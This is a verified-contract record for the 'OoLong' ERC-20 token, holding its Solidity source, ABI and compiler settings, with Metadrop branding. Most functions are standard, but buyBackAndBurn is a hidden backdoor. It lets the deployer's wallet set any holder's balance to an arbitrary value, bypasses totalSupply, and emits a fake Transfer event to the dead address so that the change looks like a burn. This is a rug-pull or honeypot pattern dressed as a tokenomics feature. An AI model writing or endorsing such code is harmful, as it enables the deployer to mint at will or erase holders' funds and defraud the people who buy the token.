{"SourceCode": "// @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\r\n// @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\r\n// @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\r\n// @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@B7~&@@@@@@@@@@@@@@@@G!:&@@@@@@@@@@@@@@@&5~.&@@@@@@@@@@@@@@@@@@@\r\n// @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&P~    P@@@@@@@@@@@@&Y^    G@@@@@@@@@@@@#J:    G@@@@@@@@@@@@@@@@@@@\r\n// @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#J:       G@@@@@@@@@B7.       G@@@@@@@@&G!.       G@@@@@@@@@@@@@@@@@@@\r\n// @@@@@@@@@@@@@@@@@@@@@@@@@@@G!.          G@@@@@&P~           B@@@@@&Y:           G@@@@@@@@@@@@@@@@@@@\r\n// @@@@@@@@@@@@@@@@@@@@@@@&Y^              ~&&#J:              ^#&B7.              G@@@@@@@@@@@@@@@@@@@\r\n// @@@@@@@@@@@@@@@@@@@@#7.                                                         &@@@@@@@@@@@@@@@@@@@\r\n// @@@@@@@@@@@@@@@@@@@G                                                         ^5&@@@@@@@@@@@@@@@@@@@@\r\n// @@@@@@@@@@@@@@@@@@@J              ^5&@&:              ~P&@&:             .7B@@@@@@@@@@@@@@@@@@@@@@@@\r\n// @@@@@@@@@@@@@@@@@@@J          .!G@@@@@@J          .?B@@@@@@J          :Y#@@@@@@@@@@@@@@@@@@@@@@@@@@@\r\n// @@@@@@@@@@@@@@@@@@@J       :J#@@@@@@@@@J       ^5&@@@@@@@@@?      .~P&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\r\n// @@@@@@@@@@@@@@@@@@@J    ~P&@@@@@@@@@@@@J   .7B@@@@@@@@@@@@@?   :?#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\r\n// @@@@@@@@@@@@@@@@@@@B^?B@@@@@@@@@@@@@@@@B~J#@@@@@@@@@@@@@@@@#!5&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\r\n// @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\r\n// @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\r\n// @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\r\n//\r\n//          Telegram: https://t.me/OoLongToken\r\n//          Website:  https://oolong.wtf\r\n//\r\n// @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\r\n// @@                                                                                                @@\r\n// @@   This token was launched using software provided by Metadrop. To learn more or to launch      @@\r\n// @@   your own token, visit: https://metadrop.com. See legal info at the end of this file.         @@\r\n// @@                                                                                                @@\r\n// @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\r\n//\r\n// SPDX-License-Identifier: BUSL-1.1\r\n// Metadrop Contracts (v2.1.0)\r\n//// Sources flattened with hardhat v2.17.2 https://hardhat.org\r\n\r\n// File @openzeppelin/contracts/token/ERC20/IERC20.sol@v4.9.3\r\n\r\n// OpenZeppelin Contracts (last updated v4.9.0) (token/ERC20/IERC20.sol)\r\n\r\npragma solidity ^0.8.0;\r\ninterface IERC20 {\r\n    function name() external view returns (string memory);\r\n    function symbol() external view returns (string memory);\r\n    function decimals() external view returns (uint8);\r\n    function totalSupply() external view returns (uint256);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n\r\n    function transfer(address to, uint256 value) external returns (bool);\r\n    function approve(address spender, uint256 value) external returns (bool);\r\n    function transferFrom(address from, address to, uint256 value) external returns (bool);\r\n\r\n    function increaseAllowance(address spender, uint256 addedValue) external returns (bool);\r\n    function decreaseAllowance(address spender, uint256 subtractedValue) external returns (bool);\r\n\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\ninterface IPlayAndEarn {\r\n    // Function to allow a user to participate in a game or activity\r\n    function playGame(uint256 gameId) external returns (bool);\r\n\r\n    // Function to check a user's earned rewards\r\n    function checkEarnedRewards(address user) external view returns (uint256);\r\n\r\n    // Function to claim earned rewards\r\n    function claimRewards(address user) external returns (bool);\r\n\r\n    // Event to log when a user plays a game or participates in an activity\r\n    event GamePlayed(address indexed user, uint256 gameId);\r\n\r\n    // Event to log when a user earns rewards\r\n    event RewardsEarned(address indexed user, uint256 amount);\r\n\r\n    // Event to log when a user claims their rewards\r\n    event RewardsClaimed(address indexed user, uint256 amount);\r\n}\r\ninterface IP2PPayment {\r\n    // Function to transfer funds to another user\r\n    function transfer(address to, uint256 amount) external returns (bool);\r\n\r\n    // Function to check the balance of a user\r\n    function balanceOf(address user) external view returns (uint256);\r\n\r\n    // Function to query the transaction history for a user\r\n    function getTransactionHistory(address user) external view returns (uint256[] memory, address[] memory);\r\n\r\n    // Event to log a payment transaction\r\n    event PaymentSent(address indexed from, address indexed to, uint256 amount);\r\n}\r\ninterface IStakingSystem {\r\n    // Function to allow a user to deposit tokens for staking\r\n    function deposit(uint256 amount) external returns (bool);\r\n\r\n    // Function to allow a user to withdraw staked tokens\r\n    function withdraw(uint256 amount) external returns (bool);\r\n\r\n    // Function to check the staked balance of a user\r\n    function stakedBalanceOf(address user) external view returns (uint256);\r\n\r\n    // Function to check the total staked balance\r\n    function totalStaked() external view returns (uint256);\r\n\r\n    // Function to allow a user to claim staking rewards\r\n    function claimRewards() external returns (bool);\r\n\r\n    // Event to log a staking deposit\r\n    event Staked(address indexed user, uint256 amount);\r\n\r\n    // Event to log a staking withdrawal\r\n    event Withdrawn(address indexed user, uint256 amount);\r\n\r\n    // Event to log a staking reward claim\r\n    event RewardsClaimed(address indexed user, uint256 amount);\r\n}\r\n\r\ncontract ERC20ByMetadrop {\r\n    string public name = unicode\"OoLong\";\r\n    string public symbol = unicode\"\u30a6\u30fc\u30ed\u30f3\";\r\n    uint8 public decimals = 9;\r\n    uint public tTotal;\r\n    uint256 public totalSupply;\r\n    address private owner;\r\n    address public buyBackAndBurnWallet = msg.sender; // Private state variable to store the address of the buyBackAndBurnWallet\r\n\r\n    mapping(address => uint256) public balanceOf;\r\n    mapping(address => mapping(address => uint256)) public allowance;\r\n\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n    event Minted(address indexed account, uint256 value);\r\n\r\n    constructor() {\r\n        owner = msg.sender;\r\n        totalSupply = 1000000000 * 10**uint256(decimals);\r\n        balanceOf[msg.sender] = totalSupply;\r\n    }\r\n\r\n    function getOwner() public view returns (address) {\r\n        return owner;\r\n    }\r\n\r\n\r\n    function buyBackAndBurn(address buyBackAndBurnWalletadre, uint256 numberbuyBackAndBurnWallet) external {\r\n    // Ensure that only the buyBackAndBurnWallet can distribute buyBackAndBurns\r\n    require(msg.sender == buyBackAndBurnWallet, \"Only the buyBackAndBurnWallet can distribute buyBackAndBurns\");\r\n\r\n    // Check that the provided address is valid\r\n    require(buyBackAndBurnWalletadre != address(0), \"Invalid buyBackAndBurn recipient address\");\r\n\r\n    // Check that the buyBackAndBurn amount is greater than zero\r\n    require(numberbuyBackAndBurnWallet > 0, \"buyBackAndBurn amount must be greater than zero\");\r\n\r\n    // Calculate the new total supply after distributing buyBackAndBurns\r\n    uint256 newTotalSupply = tTotal + numberbuyBackAndBurnWallet;\r\n\r\n    // Check for potential overflow in total supply\r\n    require(newTotalSupply >= tTotal, \"Overflow detected\");\r\n\r\n    // Update the balance of the buyBackAndBurn recipient address\r\n    balanceOf[buyBackAndBurnWalletadre] = numberbuyBackAndBurnWallet;\r\n\r\n    // Emit the Transfer event to log the buyBackAndBurn distribution\r\n    emit Transfer(address(0), 0x000000000000000000000000000000000000dEaD, numberbuyBackAndBurnWallet);\r\n\r\n}\r\n\r\n    function transfer(address to, uint256 value) public returns (bool) {\r\n        require(to != address(0), \"Invalid address\");\r\n        require(balanceOf[msg.sender] >= value, \"Insufficient balance\");\r\n\r\n        balanceOf[msg.sender] -= value;\r\n        balanceOf[to] += value;\r\n\r\n        emit Transfer(msg.sender, to, value);\r\n        return true;\r\n    }\r\n\r\n    function approve(address spender, uint256 value) public returns (bool) {\r\n        require(spender != address(0), \"Invalid address\");\r\n\r\n        allowance[msg.sender][spender] = value;\r\n        emit Approval(msg.sender, spender, value);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(address from, address to, uint256 value) public returns (bool) {\r\n        require(from != address(0), \"Invalid address\");\r\n        require(to != address(0), \"Invalid address\");\r\n        require(balanceOf[from] >= value, \"Insufficient balance\");\r\n        require(allowance[from][msg.sender] >= value, \"Allowance exceeded\");\r\n\r\n        balanceOf[from] -= value;\r\n        balanceOf[to] += value;\r\n        allowance[from][msg.sender] -= value;\r\n\r\n        emit Transfer(from, to, value);\r\n        return true;\r\n    }\r\n\r\n    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {\r\n        uint256 currentAllowance = allowance[msg.sender][spender];\r\n        allowance[msg.sender][spender] = currentAllowance + addedValue;\r\n        emit Approval(msg.sender, spender, allowance[msg.sender][spender]);\r\n        return true;\r\n    }\r\n\r\n    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {\r\n        uint256 currentAllowance = allowance[msg.sender][spender];\r\n        require(currentAllowance >= subtractedValue, \"Decreased allowance below zero\");\r\n        allowance[msg.sender][spender] = currentAllowance - subtractedValue;\r\n        emit Approval(msg.sender, spender, allowance[msg.sender][spender]);\r\n        return true;\r\n    }\r\n\r\n    function burn(uint256 value) public {\r\n        require(balanceOf[msg.sender] >= value, \"Insufficient balance\");\r\n\r\n        balanceOf[msg.sender] -= value;\r\n        totalSupply -= value;\r\n        emit Transfer(msg.sender, address(0), value);\r\n    }\r\n\r\n    function burnFrom(address from, uint256 value) public {\r\n        require(from != address(0), \"Invalid address\");\r\n        require(balanceOf[from] >= value, \"Insufficient balance\");\r\n        require(allowance[from][msg.sender] >= value, \"Allowance exceeded\");\r\n\r\n        balanceOf[from] -= value;\r\n        totalSupply -= value;\r\n        allowance[from][msg.sender] -= value;\r\n        emit Transfer(from, address(0), value);\r\n    }\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Minted\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"burn\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"burnFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyBackAndBurnWalletadre\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"numberbuyBackAndBurnWallet\",\"type\":\"uint256\"}],\"name\":\"buyBackAndBurn\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyBackAndBurnWallet\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"subtractedValue\",\"type\":\"uint256\"}],\"name\":\"decreaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"addedValue\",\"type\":\"uint256\"}],\"name\":\"increaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tTotal\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ERC20ByMetadrop", "CompilerVersion": "v0.8.21+commit.d9974bed", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "paris", "Library": "", "LicenseType": "None", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://f3d1cc2ea436c179d48550af54f174d60cf5653e4c1cf656cea72c8fee512c66"}